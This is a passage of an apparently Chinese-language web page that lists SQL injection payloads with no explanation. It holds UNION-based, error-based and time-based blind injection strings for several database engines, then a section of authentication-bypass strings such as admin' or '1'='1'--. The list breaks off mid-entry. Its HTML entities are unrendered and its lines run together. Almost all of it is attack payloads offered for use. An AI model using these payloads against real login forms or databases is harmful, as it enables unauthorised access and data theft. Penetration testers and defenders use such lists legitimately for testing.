@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT NULL-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- UNION ALL SELECT NULL#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#UNION ALL SELECT NULL AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#UNION ALL SELECT &#x27;INJ&#x27;||&#x27;ECT&#x27;||&#x27;XXX&#x27;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25# SQL 注入身份验证绕过有效负载1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677&#x27;-&#x27;&#x27; &#x27;&#x27;&amp;&#x27;&#x27;^&#x27;&#x27;*&#x27;&#x27; or &#x27;&#x27;-&#x27;&#x27; or &#x27;&#x27; &#x27;&#x27; or &#x27;&#x27;&amp;&#x27;&#x27; or &#x27;&#x27;^&#x27;&#x27; or &#x27;&#x27;*&#x27;&quot;-&quot;&quot; &quot;&quot;&amp;&quot;&quot;^&quot;&quot;*&quot;&quot; or &quot;&quot;-&quot;&quot; or &quot;&quot; &quot;&quot; or &quot;&quot;&amp;&quot;&quot; or &quot;&quot;^&quot;&quot; or &quot;&quot;*&quot;or true--&quot; or true--&#x27; or true--&quot;) or true--&#x27;) or true--&#x27; or &#x27;x&#x27;=&#x27;x&#x27;) or (&#x27;x&#x27;)=(&#x27;x&#x27;)) or ((&#x27;x&#x27;))=((&#x27;x&quot; or &quot;x&quot;=&quot;x&quot;) or (&quot;x&quot;)=(&quot;x&quot;)) or ((&quot;x&quot;))=((&quot;xor 1=1or 1=1--or 1=1#or 1=1/*admin&#x27; --admin&#x27; #admin&#x27;/*admin&#x27; or &#x27;1&#x27;=&#x27;1admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27;--admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27;#admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27;/*admin&#x27;or 1=1 or &#x27;&#x27;=&#x27;admin&#x27; or 1=1admin&#x27; or 1=1--admin&#x27; or 1=1#admin&#x27; or 1=1/*admin&#x27;) or (&#x27;1&#x27;=&#x27;1admin&#x27;) or (&#x27;1&#x27;=&#x27;1&#x27;--admin&#x27;) or (&#x27;1&#x27;=&#x27;1&#x27;#admin&#x27;) or (&#x27;1&#x27;=&#x27;1&#x27;/*admin&#x27;) or &#x27;1&#x27;=&#x27;1admin&#x27;) or &#x27;1&#x27;=&#x27;1&#x27;--admin&#x27;) or &#x27;1&#x27;=&#x27;1&#x27;#admin&#x27;) or 